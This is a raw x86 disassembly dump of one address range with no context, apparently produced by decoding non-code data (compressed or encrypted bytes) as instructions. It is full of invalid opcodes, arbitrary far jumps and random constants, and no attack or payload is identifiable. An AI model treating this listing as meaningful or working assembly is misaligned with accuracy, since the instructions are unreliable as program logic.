  4221ae:	ss pop eax
  4221b0:	xchg   ebp,eax
  4221b1:	inc    esi
  4221b2:	pushf  
  4221b3:	ret    
  4221b4:	das    
  4221b5:	push   esi
  4221b6:	jmp    0x4221dd
  4221b8:	pop    esi
  4221b9:	jmp    0xb5d49b81
  4221be:	scas   al,BYTE PTR es:[edi]
  4221bf:	or     DWORD PTR [esi+0x765615fb],esi
  4221c5:	fwait
  4221c6:	stos   BYTE PTR es:[edi],al
  4221c7:	int    0x1a
  4221c9:	adc    BYTE PTR [edx+0x2c],bh
  4221cc:	mov    bh,0x0
  4221ce:	add    BYTE PTR [eax],al
  4221d0:	add    BYTE PTR [eax],al
  4221d2:	fnstenv [esi-0x2490e49a]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	ret    0x799b
  4221e1:	ins    DWORD PTR es:[edi],dx
  4221e2:	scas   al,BYTE PTR es:[edi]
  4221e3:	fadd   DWORD PTR [ecx]
  4221e5:	add    BYTE PTR [ebx+0x0],ah
  4221e8:	add    BYTE PTR [eax],al
  4221ea:	inc    edx
  4221eb:	in     eax,0xa5
  4221ed:	jbe    0x4221f5
  4221ef:	xchg   ebx,eax
  4221f0:	jmp    0x422266
  4221f2:	loopne 0x422258
  4221f4:	fdivr  QWORD PTR [edx-0x5e944cdc]
  4221fa:	sbb    al,0x10
  4221fc:	shr    DWORD PTR [edi-0x10],0x24
  422200:	add    eax,0xece2cac1
  422205:	popf   
  422206:	je     0x4221f9
  422208:	mov    ebx,0x15df583f
  42220d:	pop    esi
  42220e:	inc    ecx
  42220f:	mov    esi,0x2985b05e
  422214:	cld    
  422215:	or     eax,0xeb5b61bb
  42221a:	js     0x42220b
  42221c:	jbe    0x422255
  42221e:	stos   BYTE PTR es:[edi],al
  42221f:	ins    BYTE PTR es:[edi],dx
  422220:	and    eax,0x40d36534
  422225:	lock sar BYTE PTR [ecx-0x5c1baa0b],0x7f
  42222d:	mov    ?,WORD PTR [eax-0x6e]
  422230:	inc    esi
  422231:	jmp    0xf20e:0xc8a84f1b
  422238:	sbb    al,0x58
  42223a:	out    dx,eax
  42223b:	shl    BYTE PTR [ecx+eiz*2],1
  42223e:	xor    al,0x99
  422240:	ja     0x422202
  422242:	test   DWORD PTR [edi+0x6fa20b87],ecx
  422248:	in     eax,dx
  422249:	sahf   
  42224a:	or     DWORD PTR [eax+0x25],esp
  42224d:	add    BYTE PTR [eax],al
  42224f:	add    BYTE PTR [eax],al
  422251:	add    dl,bl
  422253:	xor    dl,BYTE PTR [edi-0x20500076]
  422259:	jb     0x42225e
  42225b:	inc    ebp
  42225c:	mov    ds:0xc3b10a5c,eax
  422261:	scas   al,BYTE PTR es:[edi]
  422262:	adc    ecx,ebx
  422264:	add    DWORD PTR [eax],eax
  422266:	arpl   WORD PTR [eax],ax
  422268:	add    BYTE PTR [eax],al
  42226a:	sub    eax,0x376773a4
  42226f:	in     al,0xcd
  422271:	or     BYTE PTR [edi],bl
  422273:	cs mov ebx,0x3635ee46
  422279:	sub    al,0xd
  42227b:	mov    al,0x14
  42227d:	sbb    eax,0x573b688e
  422282:	adc    cl,BYTE PTR [eax]
  422284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422285:	or     DWORD PTR [ecx+esi*1],eax
  422288:	test   al,0x16
  42228a:	test   BYTE PTR [esp+edx*8+0x5],bh
  42228e:	mov    fs,WORD PTR [ecx+0x3c]
  422291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422293:	ror    DWORD PTR [ecx+0x62],0xaa
  422297:	jmp    0x634f:0xd27ee1c0
  42229e:	xchg   ebp,eax
  42229f:	fild   QWORD PTR [ebx+0x7a]
  4222a2:	mov    eax,0x84a04e8d
  4222a7:	pushf  
  4222a8:	sbb    ecx,DWORD PTR [eax+0x363c8df6]
  4222ae:	mov    esi,0xdbd1f568
  4222b3:	scas   eax,DWORD PTR es:[edi]
  4222b4:	ja     0x422256
  4222b6:	pop    ebx
  4222b7:	sub    edx,DWORD PTR [ebx-0xb840c1d]
  4222bd:	dec    ecx
  4222be:	sub    al,0x32
  4222c0:	mov    ebx,0x2908d68d
  4222c5:	mov    cl,0xfd
  4222c7:	jbe    0x4222f8
  4222c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ca:	xchg   ecx,eax
  4222cb:	aad    0x3e
  4222cd:	add    BYTE PTR [eax],al
  4222cf:	add    BYTE PTR [eax],al
  4222d1:	add    BYTE PTR [eax-0x1c],cl
  4222d4:	add    ebx,DWORD PTR [ebx-0x8270051]
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0x738fa18f],bl
  4222e1:	daa    
  4222e2:	je     0x4222bd
  4222e4:	add    DWORD PTR [eax],eax
  4222e6:	arpl   WORD PTR [eax],ax
  4222e8:	add    BYTE PTR [eax],al
  4222ea:	inc    edi
  4222eb:	cmp    BYTE PTR [edi],0x6c
  4222ee:	test   esp,ebx
  4222f0:	or     BYTE PTR [edi+0x9a32608],cl
  4222f6:	stos   DWORD PTR es:[edi],eax
  4222f7:	sbb    DWORD PTR [ebp+0x33],0xffffffb7
  4222fb:	jmp    0x422325
  4222fd:	loope  0x422373
  4222ff:	in     eax,dx
  422300:	add    eax,0x77e620b5
  422305:	add    edx,DWORD PTR [eax]
  422307:	push   ebp
  422308:	dec    esi
  422309:	or     al,0x85
  42230b:	ins    BYTE PTR es:[edi],dx
  42230c:	mov    edx,DWORD PTR [ecx+0x1a09cccf]
  422312:	xchg   ebx,eax
  422313:	mov    dh,0xf4
  422315:	mov    dl,0x63
  422317:	dec    ebp
  422318:	imul   ebp,esp,0x3a5166ef
  42231e:	xor    eax,0x887f0fde
  422323:	jle    0x422351
  422325:	(bad)  
  422326:	jns    0x42232e
  422328:	sar    DWORD PTR [edi+0x7],cl
  42232b:	test   al,0xfb
  42232d:	push   eax
  42232e:	stos   BYTE PTR es:[edi],al
  42232f:	push   cs
  422330:	(bad)  [ebx-0x7c564829]
  422336:	(bad)  
  422337:	sbb    al,0xda
  422339:	dec    ebx
  42233a:	mov    WORD PTR [esi-0x8cc3c7c],ss
  422340:	pop    ebp
  422341:	inc    esp
  422342:	div    edi
  422344:	ror    ebx,0xef
  422347:	mov    ecx,0x40dffc98
  42234c:	out    0x0,al
  42234e:	add    BYTE PTR [eax],al
  422350:	add    BYTE PTR [eax],al
  422352:	push   edx
  422353:	add    al,0xa2
  422355:	xor    dh,0xa6
  422358:	jb     0x42232e
  42235a:	ins    DWORD PTR es:[edi],dx
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0x64f95152
  422362:	xlat   BYTE PTR ds:[ebx]
  422363:	fld    DWORD PTR [ecx]
  422365:	add    BYTE PTR [ebx+0x0],ah
  422368:	add    BYTE PTR [eax],al
  42236a:	ins    BYTE PTR es:[edi],dx
  42236b:	sub    esp,ecx
  42236d:	out    0x68,al
  42236f:	sbb    dh,BYTE PTR [ecx+edi*4]
  422372:	inc    eax
  422373:	jae    0x42237f
  422375:	sbb    edi,eax
  422377:	xchg   edx,eax
  422378:	call   0x772f:0x29716048
  42237f:	pusha  
  422380:	arpl   WORD PTR [edx+ebx*4],bx
  422383:	jnp    0x4223a0
  422385:	jecxz  0x4223c4
  422387:	pop    es
  422388:	not    DWORD PTR [esi-0x21]
  42238b:	jnp    0x4223e6
  42238d:	xchg   ebx,eax
  42238e:	retf   0x8dbc
  422391:	push   edi
  422392:	jle    0x4223ca
  422394:	nop
  422395:	push   ds
  422396:	(bad)  
  422397:	lds    edx,FWORD PTR [edx-0x41]
  42239a:	dec    ebx
  42239b:	jl     0x422333
  42239d:	mov    ecx,0xe21c93e3
  4223a2:	sbb    eax,0x45aca2e5
  4223a7:	sahf   
  4223a8:	mov    bl,0xac
  4223aa:	addr16 ds ja 0x422358
  4223ae:	pop    ecx
  4223af:	mov    al,cl
  4223b1:	fistp  DWORD PTR [edx+eiz*8-0x2912ecba]
  4223b8:	(bad)  
  4223b9:	ins    BYTE PTR es:[edi],dx
  4223ba:	int    0x54
  4223bc:	or     edx,DWORD PTR [edi]
  4223be:	adc    al,0xf0
  4223c0:	bound  edx,QWORD PTR [edi+0x2c6403be]
  4223c6:	and    DWORD PTR [edx],esi
  4223c8:	inc    ebx
  4223c9:	mov    bh,0xf3
  4223cb:	or     BYTE PTR [edx+0x0],0x0
  4223cf:	add    BYTE PTR [eax],al
  4223d1:	add    BYTE PTR [eax],bh
  4223d3:	push   0xffffff96
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0xe5,eax
  4223df:	xchg   DWORD PTR [esi-0x11],ebx
  4223e2:	cmp    bl,dl
  4223e4:	add    DWORD PTR [eax],eax
  4223e6:	arpl   WORD PTR [eax],ax
  4223e8:	add    BYTE PTR [eax],al
  4223ea:	popf   
  4223eb:	pop    edi
  4223ec:	loopne 0x4223f3
  4223ee:	push   edi
  4223ef:	lds    eax,FWORD PTR [eax]
  4223f1:	mov    fs,WORD PTR [ecx]
  4223f3:	shl    ch,1
  4223f5:	aam    0x9f
  4223f7:	into   
  4223f8:	ins    BYTE PTR es:[edi],dx
  4223f9:	(bad)
  4223fe:	push   0x613fb355
  422403:	cmp    dl,bh
  422405:	dec    ecx
  422406:	inc    ebx
  422407:	fcmovnbe st,st(5)
  422409:	ss mov ecx,0x4fb8f4f2
  42240f:	jno    0x4223b8
  422411:	mov    edx,0x4f44c8a4
  422416:	cmp    eax,0xfcb24082
  42241b:	dec    edi
  42241c:	sbb    al,0x6f
  42241e:	push   ds
  42241f:	psubw  mm4,mm4
  422422:	mov    es,WORD PTR [esi]
  422424:	les    esp,FWORD PTR [edi]
  422426:	pop    esp
  422427:	mov    edx,0xe492c5ed
  42242c:	call   0xfd2c8c67
  422431:	nop
  422432:	lods   eax,DWORD PTR ds:[esi]
  422433:	fbld   TBYTE PTR [edi-0x11]
  422436:	add    eax,0xd487bd04
  42243b:	push   0x53d73f2d
  422440:	jl     0x422486
  422442:	les    esi,FWORD PTR [edx-0x54]
  422445:	xor    edi,eax
  422447:	xchg   ebx,eax
  422448:	nop
  422449:	out    dx,al
  42244a:	and    dl,0xe3
  42244d:	add    BYTE PTR [eax],al
  42244f:	add    BYTE PTR [eax],al
  422451:	add    cl,ch
  422453:	mov    ecx,0xf37a307a
  422458:	jmp    0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	shl    DWORD PTR fs:[esi+0x1da9d97],1
  422465:	add    BYTE PTR [ebx+0x0],ah
  422468:	add    BYTE PTR [eax],al
  42246a:	shl    edi,1
  42246c:	pop    ss
  42246d:	popf   
  42246e:	or     DWORD PTR ds:0x4595d8a6,edi
  422474:	inc    edx
  422475:	pusha  
  422476:	pop    esp
  422477:	out    0xcd,al
  422479:	mov    esp,0xd5517fdd
  42247e:	add    ah,bl
  422480:	neg    BYTE PTR [ebx-0x10849cb5]
  422486:	push   esp
  422487:	clc    
  422488:	std    
  422489:	fnstenv [edx]
  42248b:	dec    ebx
  42248c:	into   
  42248d:	adc    ebp,edi
  42248f:	jnp    0x422459
  422491:	cld    
  422492:	retf   
  422493:	mov    al,ds:0x9f6a5820
  422498:	es jo  0x422478
  42249b:	in     al,0xec
  42249d:	mov    ds:0xcd67cf05,eax
  4224a2:	mov    cl,0xca
  4224a4:	or     edx,DWORD PTR [ebp-0x265698fd]
  4224aa:	cld    
  4224ab:	out    0xb8,eax
  4224ad:	pop    ebp
  4224ae:	cmp    al,0xbd
  4224b0:	in     eax,0xc6
  4224b2:	fwait
  4224b3:	xchg   edi,eax
  4224b4:	aaa    
  4224b5:	mov    WORD PTR [edx],ds
  4224b7:	adc    BYTE PTR [ecx-0x4edcc0c1],cl
  4224bd:	fdivrp st(5),st
  4224bf:	jecxz  0x4224fd
  4224c1:	int3   
  4224c2:	jg     0x422468
  4224c4:	lods   eax,DWORD PTR ds:[esi]
  4224c5:	mov    dl,0x50
  4224c7:	in     al,0x30
  4224c9:	mov    bh,0x14
  4224cb:	mov    ebp,DWORD PTR [eax+eax*1]
  4224ce:	add    BYTE PTR [eax],al
  4224d0:	add    BYTE PTR [eax],al
  4224d2:	pop    ebx
  4224d3:	inc    ecx
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	popa   
  4224df:	fsub   DWORD PTR [ecx+edx*4+0x0]
  4224e3:	fild   DWORD PTR [ecx]
  4224e5:	add    BYTE PTR [ebx+0x0],ah
  4224e8:	add    BYTE PTR [eax],al
  4224ea:	xor    esp,DWORD PTR [ebx-0x44]
  4224ed:	dec    esi
  4224ee:	inc    ecx
  4224ef:	jbe    0x422549
  4224f1:	sti    
  4224f2:	mov    ecx,0x1560fefb
  4224f7:	lea    esi,[ecx]
  4224f9:	bound  edx,QWORD PTR [ecx-0x6]
  4224fc:	sbb    DWORD PTR [ebp+0x45],edi
  4224ff:	imul   edi,ebx,0xffffff96
  422502:	nop
  422503:	in     al,dx
  422504:	xchg   esp,eax
  422505:	pop    ecx
  422506:	les    ebp,FWORD PTR [esi]
  422508:	inc    eax
  422509:	jae    0x422536
  42250b:	in     eax,dx
  42250c:	sbb    DWORD PTR [edx-0x5948ddaa],esi
  422512:	push   edi
  422513:	and    ebp,edi
  422515:	aad    0x9b
  422517:	jbe    0x4224af
  422519:	cmp    al,0x2d
  42251b:	sub    DWORD PTR [eax-0x6ec38dec],0x7d09451e
  422525:	ret    0xc60e
  422528:	imul   esp,DWORD PTR [esi],0x1fd4fbd2
  42252e:	lahf   
  42252f:	push   ecx
  422530:	or     al,0x15
  422532:	jb     0x422509
  422534:	xor    BYTE PTR [ecx-0x2f],dh
  422537:	leave  
  422538:	or     BYTE PTR [esi+edi*4+0x1],ch
  42253c:	mov    esi,0x832ce32f
  422541:	fwait
  422542:	adc    BYTE PTR ds:0x1312cdaa,0x5
  422549:	cwde   
  42254a:	xor    BYTE PTR [eax-0x7c],ah
  42254d:	add    BYTE PTR [eax],al
  42254f:	add    BYTE PTR [eax],al
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	mov    bl,0x5d
  422560:	inc    edx
  422561:	or     ah,BYTE PTR [ebx-0x25]
  422564:	add    DWORD PTR [eax],eax
  422566:	arpl   WORD PTR [eax],ax
  422568:	add    BYTE PTR [eax],al
  42256a:	adc    ah,BYTE PTR [esi+0x1305977a]
  422570:	inc    ecx
  422571:	ss inc esp
  422573:	sub    ah,ch
  422575:	lods   al,BYTE PTR ds:[esi]
  422576:	adc    esi,edx
  422578:	add    DWORD PTR [eax-0x899a7ea],esp
  42257e:	cwde   
  42257f:	sbb    ebp,DWORD PTR [eax-0x8107740]
  422585:	xor    al,0x42
  422587:	ds hlt 
  422589:	paddsb mm4,mm7
  42258c:	jo     0x4225a5
  42258e:	jl     0x42251d
  422590:	out    dx,al
  422591:	pop    esi
  422592:	jmp    0x422572
  422594:	aaa    
  422595:	int    0x5f
  422597:	(bad)  
  422599:	sub    bl,BYTE PTR [edx+0x56]
  42259c:	jecxz  0x422539
  42259e:	xchg   esi,eax
  42259f:	sti    
  4225a0:	xchg   ebp,eax
  4225a1:	sar    esi,1
  4225a3:	xchg   BYTE PTR [edx],ah
  4225a5:	ja     0x422561
  4225a7:	sub    dh,al
  4225a9:	or     eax,0xea9e15cd
  4225ae:	sbb    BYTE PTR [ecx-0x59d0460d],dl
  4225b4:	jne    0x422614
  4225b6:	push   ebx
  4225b7:	pop    DWORD PTR [esi+edx*1-0x4c]
  4225bb:	int3   
  4225bc:	int3   
  4225bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225be:	xor    esp,eax
  4225c0:	mov    BYTE PTR [edi],0x12
  4225c3:	jns    0x42262c
  4225c5:	aad    0xbb
  4225c7:	jl     0x4225e1
  4225c9:	xor    eax,0xf4fef0
  4225ce:	add    BYTE PTR [eax],al
  4225d0:	add    BYTE PTR [eax],al
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	jae    0x4225c5
  4225d5:	retf   0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0x3af8ce9
  4225e0:	xchg   edi,eax
  4225e1:	call   0x63:0x1dbc6
  4225e8:	add    BYTE PTR [eax],al
  4225ea:	xchg   bl,bh
  4225ec:	or     al,0x4f
  4225ee:	cmp    BYTE PTR [edx+0x17335c39],0x2c
  4225f5:	mov    ah,0xeb
  4225f7:	ss pop ecx
  4225f9:	gs xor al,0x79
  4225fc:	xchg   DWORD PTR [edx-0x2b],esi
  4225ff:	cmp    bl,BYTE PTR [edi+ecx*8-0x7cadb54c]
  422606:	out    dx,eax
  422607:	ret    0x1163
  42260a:	aas    
  42260b:	jecxz  0x422604
  42260d:	iret   
  42260e:	push   es
  42260f:	bound  ebx,QWORD PTR [edi+0x449ef9b8]
  422615:	lds    eax,FWORD PTR [ecx+0x7f]
  422618:	mov    WORD PTR [eax+0x9f24d8c],ds
  42261e:	adc    bh,cl
  422620:	push   cs
  422621:	sub    eax,0x258f5d4a
  422626:	adc    bh,BYTE PTR [eax-0x22]
  422629:	stos   DWORD PTR es:[edi],eax
  42262a:	mov    ebx,0xaa222be0
  42262f:	add    edi,DWORD PTR [ebx-0x6ed74054]
  422635:	and    eax,ebp
  422637:	jns    0x422662
  422639:	std    
  42263a:	inc    ebp
  42263b:	dec    ebp
  42263c:	mov    cl,0x69
  42263e:	mov    al,ds:0xd4a46f71
  422643:	push   ds
  422644:	fld    TBYTE PTR [ecx]
  422646:	sbb    bl,cl
  422648:	add    bh,BYTE PTR [ecx+0x6a]
  42264b:	fsubr  QWORD PTR [eax]
  42264d:	add    BYTE PTR [eax],al
  42264f:	add    BYTE PTR [eax],al
  422651:	add    ch,dh
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx-0x7707237a]
  422662:	sub    esp,ebx
  422664:	add    DWORD PTR [eax],eax
  422666:	arpl   WORD PTR [eax],ax
  422668:	add    BYTE PTR [eax],al
  42266a:	scas   eax,DWORD PTR es:[edi]
  42266b:	out    0x20,al
  42266d:	aad    0x5a
  42266f:	xor    eax,0x4df12b26
  422674:	enter  0x1744,0x47
  422678:	and    eax,DWORD PTR [edi+edx*4-0x50193d44]
  42267f:	test   al,0x8f
  422681:	in     eax,0xb6
  422683:	mov    esp,0x8cb59d99
  422688:	pop    ecx
  422689:	ins    BYTE PTR es:[edi],dx
  42268a:	sub    al,0x14
  42268c:	out    dx,eax
  42268d:	adc    ah,bl
  42268f:	lods   eax,DWORD PTR ds:[esi]
  422690:	cmp    eax,0xa6474e29
  422695:	xchg   ebx,eax
  422696:	daa    
  422697:	iret   
  422698:	int    0x4c
  42269a:	xchg   ebx,eax
  42269b:	popa   
  42269c:	mov    BYTE PTR [ebp+0x629cf6c9],bh
  4226a2:	cld    
  4226a3:	xchg   ah,dh
  4226a5:	push   edi
  4226a6:	mov    eax,ds:0x1a1bac72
  4226ab:	xor    ebx,eax
  4226ad:	and    al,0xe1
  4226af:	pop    edi
  4226b0:	pop    edi
  4226b1:	rol    BYTE PTR [ebp-0x5a2350a6],1
  4226b7:	inc    edi
  4226b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b9:	mov    ah,0xcf
  4226bb:	or     DWORD PTR [ebx],0x70
  4226be:	pusha  
  4226bf:	stos   BYTE PTR es:[edi],al
  4226c0:	stos   BYTE PTR es:[edi],al
  4226c1:	jl     0x4226bc
  4226c3:	and    al,0xf1
  4226c5:	mov    bl,0xaa
  4226c7:	dec    ecx
  4226c8:	lahf   
  4226c9:	ja     0x422689
  4226cb:	mov    ebx,0x10
  4226d0:	add    BYTE PTR [eax],al
  4226d2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	sar    dh,0xc3
  4226e0:	mov    eax,0x1dc8c35
  4226e5:	add    BYTE PTR [ebx+0x0],ah
  4226e8:	add    BYTE PTR [eax],al
  4226ea:	add    ah,0xd8
  4226ed:	and    BYTE PTR [ebx],dh
  4226ef:	stos   DWORD PTR es:[edi],eax
  4226f0:	pop    ebp
  4226f1:	inc    esp
  4226f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226f3:	push   edi
  4226f4:	outs   dx,BYTE PTR ds:[esi]
  4226f5:	sahf   
  4226f6:	stos   DWORD PTR es:[edi],eax
  4226f7:	int3   
  4226f8:	cwde   
  4226f9:	cmp    ch,BYTE PTR [esi-0x6db11055]
  4226ff:	in     eax,dx
  422700:	mov    dl,0x2b
  422702:	and    al,0xcb
  422704:	and    al,0xf6
  422706:	pop    es
  422707:	pop    ecx
  422708:	lods   eax,DWORD PTR ds:[esi]
  422709:	push   es
  42270a:	fwait
  42270b:	mov    ecx,0x42169e9e
  422710:	cmp    eax,0xcfbd20db
  422715:	in     eax,dx
  422716:	cwde   
  422717:	(bad)  
  422718:	call   0x59587981
  42271d:	and    DWORD PTR [edi-0x25],eax
  422720:	nop
  422721:	add    BYTE PTR [ebx],ah
  422723:	adc    cl,bl
  422725:	mov    eax,ds:0x717fed39
  42272a:	lds    edi,FWORD PTR ds:0x63eb0bcf
  422730:	adc    al,0x2a
  422732:	pusha  
  422733:	or     dl,BYTE PTR [ebx-0x28]
  422736:	mov    ecx,0xffaafb97
  42273b:	push   ebp
  42273c:	sub    eax,0x697171e9
  422741:	xor    cl,al
  422743:	mov    cl,0xe
  422745:	or     al,0xe4
  422747:	(bad)  
  422748:	in     al,0xd7
  42274a:	fisttp QWORD PTR [edi+0xdb]
  422750:	add    BYTE PTR [eax],al
  422752:	aam    0xf
  422754:	push   ecx
  422755:	lock (bad) 
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	and    ebx,DWORD PTR [eax-0x23101b0a]
  422764:	add    DWORD PTR [eax],eax
  422766:	arpl   WORD PTR [eax],ax
  422768:	add    BYTE PTR [eax],al
  42276a:	adc    BYTE PTR [edi],bh
  42276c:	xor    BYTE PTR [edi-0x6ee75c3a],bh
  422772:	and    esp,DWORD PTR [edi+0x549bbcbb]
  422778:	or     DWORD PTR [edx],ebx
  42277a:	(bad)  
  42277c:	adc    al,0x40
  42277e:	stos   DWORD PTR es:[edi],eax
  42277f:	cmp    DWORD PTR [ebp-0x4c22f005],0xe4e7aee9
  422789:	cmp    BYTE PTR [eax+eax*2-0x6c],bl
  42278d:	rep stos BYTE PTR es:[edi],al
  42278f:	or     BYTE PTR [ebx-0x45],al
  422792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422793:	xchg   ecx,eax
  422794:	pushf  
  422795:	jmp    0xf1e0c3ca
  42279a:	dec    ebp
  42279b:	ret    0xd386
  42279e:	pop    ebp
  42279f:	stos   BYTE PTR es:[edi],al
  4227a0:	and    esp,eax
  4227a2:	cmp    BYTE PTR [ecx],0x3d
  4227a5:	ds retf 
  4227a7:	les    edx,FWORD PTR [edx-0x4c]
  4227aa:	loope  0x422772
  4227ac:	or     eax,DWORD PTR [edi]
  4227ae:	mov    ebp,0x6260ea4
  4227b3:	xchg   esp,eax
  4227b4:	jl     0x422821
  4227b6:	and    al,0x56
  4227b8:	lea    ebp,[edi+0x14c6407]
  4227be:	pushf  
  4227bf:	or     esi,DWORD PTR [ebx-0x1a]
  4227c2:	(bad)  
  4227c4:	xchg   edi,eax
  4227c5:	into   
  4227c6:	dec    ebx
  4227c7:	xor    al,BYTE PTR [edi-0x3a]
  4227ca:	fs loopne 0x4227ed
  4227cd:	add    BYTE PTR [eax],al
  4227cf:	add    BYTE PTR [eax],al
  4227d1:	add    ch,cl
  4227d3:	sub    eax,0xfbf54395
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	lock sar DWORD PTR ss:[edx+edx*2-0x23],1
  4227e4:	add    DWORD PTR [eax],eax
  4227e6:	arpl   WORD PTR [eax],ax
  4227e8:	add    BYTE PTR [eax],al
  4227ea:	inc    eax
  4227eb:	cmc    
  4227ec:	jo     0x42284d
  4227ee:	jecxz  0x42279a
  4227f0:	lea    esi,[ecx]
  4227f2:	jmp    0xf645:0x357f8951
  4227f9:	mov    esi,0xb9ffe740
  4227fe:	xchg   ebp,eax
  4227ff:	clc    
  422800:	ret    0xe751
  422803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422804:	mov    ?,WORD PTR [edi-0x53]
  422807:	xchg   edi,eax
  422808:	int    0x3d
  42280a:	sbb    eax,0x59740f10
  42280f:	mov    ds:0x21bac77e,eax
  422814:	pop    eax
  422815:	adc    al,0x16
  422817:	or     DWORD PTR [ebp+0x2d279d23],esp
  42281d:	and    cl,dl
  42281f:	imul   edi,DWORD PTR [edx],0xd0b5fff4
  422825:	aas    
  422826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422827:	pop    edx
  422828:	push   ebp
  422829:	mov    bh,0x66
  42282b:	aaa    
  42282c:	enter  0x2c89,0x74
  422830:	rcr    DWORD PTR [ecx+0x38],1
  422833:	mov    edx,0x59d37190
  422838:	mov    WORD PTR [eax-0x62],?
  42283b:	jo     0x422854
  42283d:	mov    ch,0xd3
  42283f:	jge    0x42284f
  422841:	aas    
  422842:	(bad)  
  422843:	ror    BYTE PTR [ecx-0x16],0x6b
  422847:	and    edx,ebp
  422849:	dec    eax
  42284a:	popa   
  42284b:	cmc    
  42284c:	(bad)  
  42284d:	add    BYTE PTR [eax],al
  42284f:	add    BYTE PTR [eax],al
  422851:	add    BYTE PTR [ebx],dl
  422853:	fs out 0xb,eax
  422856:	test   DWORD PTR [ebx-0xce58301],0x3af64cfc
  422860:	jge    0x422846
  422862:	mov    ch,0xdd
  422864:	add    DWORD PTR [eax],eax
  422866:	arpl   WORD PTR [eax],ax
  422868:	add    BYTE PTR [eax],al
  42286a:	jnp    0x4228b2
  42286c:	sub    DWORD PTR [ebp+0x554b8046],eax
  422872:	xlat   BYTE PTR ds:[ebx]
  422873:	mov    WORD PTR [eax],gs
  422875:	popf   
  422876:	enter  0x5b83,0x81
  42287a:	or     eax,0x1f03a302
  42287f:	cmc    
  422880:	out    0xe6,eax
  422882:	sbb    eax,0x485fd88a
  422887:	pusha  
  422888:	sub    DWORD PTR [eax],0x4c5dbb06
  42288e:	scas   eax,DWORD PTR es:[edi]
  42288f:	sub    ecx,DWORD PTR [edx]
  422891:	xor    DWORD PTR [ecx-0x14],0x771124b1
  422898:	test   DWORD PTR [ecx-0x55],edx
  42289b:	mov    cl,cl
  42289d:	popf   
  42289e:	sub    al,0xe
  4228a0:	jae    0x42290d
  4228a2:	mov    ecx,0x90cc6f5e
  4228a7:	lds    esi,FWORD PTR [ebx+0x46]
  4228aa:	call   0xc376:0xd509f8b7
  4228b1:	gs (bad) 
  4228b3:	adc    ch,BYTE PTR [ebx]
  4228b5:	pusha  
  4228b6:	push   esi
  4228b7:	mov    esi,0xb3dfc58
  4228bc:	mov    al,0x71
  4228be:	mov    DWORD PTR [ebp+0x49d1d76f],esi
  4228c4:	aad    0x81
  4228c6:	mov    al,ds:0xd5cad7ee
  4228cb:	lods   al,BYTE PTR ds:[esi]
  4228cc:	loope  0x4228ce
  4228ce:	add    BYTE PTR [eax],al
  4228d0:	add    BYTE PTR [eax],al
  4228d2:	add    dl,BYTE PTR ss:[ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0x19c429e4
  4228e2:	sub    al,0xd0
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	arpl   WORD PTR [eax],ax
  4228e8:	add    BYTE PTR [eax],al
  4228ea:	pop    edx
  4228eb:	cmc    
  4228ec:	fild   WORD PTR [edi-0x72c4f6c0]
  4228f2:	ret    
  4228f3:	imul   edi
  4228f5:	fmul   QWORD PTR [esi]
  4228f7:	rcr    BYTE PTR [ebx+ecx*8],cl
  4228fa:	stc    
  4228fb:	inc    esp
  4228fc:	and    DWORD PTR [edi],edx
  4228fe:	cmp    DWORD PTR [esi+0x1f02b441],ebp
  422904:	xor    dh,0x3
  422907:	fnstcw WORD PTR [eax+eiz*1]
  42290a:	dec    edx
  42290b:	push   DWORD PTR [ebp+edi*2-0x72]
  42290f:	mov    WORD PTR [ebx],?
  422911:	push   edi
  422912:	repnz push edi
  422914:	ins    DWORD PTR es:[edi],dx
  422915:	cld    
  422916:	lods   al,BYTE PTR ds:[esi]
  422917:	shl    BYTE PTR [esi-0x22],cl
  42291a:	xchg   BYTE PTR [eax+0x6895e1f],bh
  422920:	mov    edi,0x2aac09c8
  422925:	int    0x50
  422927:	(bad)  
  422928:	(bad)  
  422929:	ret    
  42292a:	stc    
  42292b:	cdq    
  42292c:	pop    ecx
  42292d:	bound  edx,QWORD PTR [edx+0x10]
  422930:	pop    edx
  422931:	xchg   edi,eax
  422932:	clc    
  422933:	mov    DWORD PTR [ebx+0x113bcf16],edx
  422939:	lahf   
  42293a:	fldenv ds:0x7a4cb7b0
  422940:	sbb    DWORD PTR [ebp+ebp*1+0x3e],eax
  422944:	pushf  
  422945:	adc    BYTE PTR [ecx],bh
  422947:	fs loop 0x422930
  42294a:	int3   
  42294b:	ret    0xf3
  42294e:	add    BYTE PTR [eax],al
  422950:	add    BYTE PTR [eax],al
